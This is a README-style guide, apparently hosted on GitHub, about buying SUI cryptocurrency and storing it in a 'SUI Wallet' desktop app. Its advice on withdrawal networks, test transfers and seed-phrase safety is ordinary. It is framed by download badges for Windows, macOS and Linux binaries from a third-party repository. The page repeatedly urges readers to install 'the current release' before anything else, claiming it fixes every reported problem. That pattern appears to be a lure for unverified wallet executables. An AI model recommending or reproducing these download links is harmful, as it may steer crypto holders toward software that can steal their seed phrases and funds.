![SUI Wallet](assets/banner-article.png)

# How to buy SUI and store it

Buying happens somewhere else; storing it is the part this wallet does.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

SUI is bought on an exchange or through a swap, then withdrawn to an address you control. The purchase is
the easy half: the withdrawal needs the right network, and the address has to be your own. Holding it on the
exchange instead is a custodial position, not self-custody, whatever the balance on screen says.

## Where SUI is bought

Two routes, and they differ in what you end up holding. An exchange sells SUI for a currency and keeps it in
an account with your name on it until you withdraw. A swap exchanges one asset for another inside a wallet
or an application, and the result is already in a wallet.

The first route is the common one and the one that needs the next section. The second skips the withdrawal
but requires you to already hold something to swap.

Either route ends with the same requirement: an address you control, on the network the asset lives on. That is why the wallet comes first rather than afterwards - creating it takes a minute and produces the address the exchange will ask for, while buying first leaves the balance on somebody else's books until a withdrawal is possible.

## The withdrawal network field

This is where most first purchases go wrong. A withdrawal form asks for an address and a network, and the
network has to be the one your address belongs to. A Sui address is not an Ethereum address with a different
prefix; sending on the wrong network produces a transfer that the receiving side cannot credit.

Copy the address from the wallet rather than from a message, paste it into the exchange form, and check that
the network selector names the same chain. Then send a small amount first.

Exchanges put this field in the same form as the address, and it is the one people skip because the address looks right. A Sui address pasted into a form set to another network is a valid-looking request that the exchange will happily send where it cannot be credited.

## The first small withdrawal

Send a small amount, confirm it arrives, then send the rest. It costs one extra transaction and it is the only way to find out that a network field was wrong before the whole balance is in flight, which is a difference worth one fee.

A withdrawal that arrives is proof of three things at once: the address is right, the network is right, and
the exchange can reach it. None of those is provable in advance by reading a form.

## Storing it: the wallet and the phrase

Once the SUI is in the wallet, the account is the 24 words. That sentence is the whole storage plan: the application can be downloaded again by anyone, and the words cannot be reconstructed by anyone, which is why the paper comes first.

Write them down before the balance arrives, not after. [SUI Wallet seed phrase setup](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/sui-wallet-seed-phrase-setup.md) covers the
screen where they appear and the confirmation step that follows it, and
[Receiving SUI into your wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/receiving-sui-into-your-wallet.md) covers the address you hand to the exchange.

## The fee and the wait

The withdrawal carries a fee from the exchange and a wait while the network includes it. The fee is the exchange's rather than the wallet's, so it does not appear in the wallet's own estimates, and the two numbers should not be expected to match.

The wait is normal and short. A withdrawal that has not arrived after a reasonable interval is usually a
network mismatch rather than a delay - check the transaction on the chain before asking anyone to resend.

## What not to do with a new balance

Three temptations cost money: sending the whole balance to a second address to test it, staking everything so nothing is left for a fee, and answering anyone who offers to activate or unlock the new balance - a message aimed at the reader who has just bought for the first time.

[Staking SUI in the wallet app](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/staking-sui-in-the-wallet-app.md) covers staking once the balance has settled, including why leaving
some spendable SUI matters.

## Cashing out

The reverse path: send the SUI from the wallet to an exchange deposit address, sell it there, and withdraw
the currency through whatever method the exchange supports. The wallet is not a bank and does not connect to
one; the exchange is where the conversion happens.

That is also why the wallet never asks for bank details. Install the current release from the
[release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest) if the sending
screens do not match this page, since the reported problems are fixed in the current release.

## FAQ

### How do I buy SUI and where should I store it?

Buy on an exchange or swap for it, withdraw to your own address on the Sui network, and keep the 24 words
off the machine. Storing it on the exchange is custody, not ownership.

### How do I buy Sui crypto?

The purchase itself happens on an exchange or in a swap. What the wallet provides is the destination, which
is the part that has to be right.

### Can you cash out a crypto wallet?

Not directly. You send to an exchange, sell there, and withdraw the money from the exchange - the wallet
holds the asset, not a currency balance.

### Can I withdraw money from a crypto wallet?

Only as crypto. A withdrawal to a bank account happens at an exchange or another service that offers it.

### Can you transfer crypto to your bank account?

Not from the wallet. That is a sale plus a bank withdrawal, and both happen outside this application.

### Do I need to buy SUI before installing?

No. Install the wallet first, write the phrase down, then buy - that order means the address exists before
the funds do.
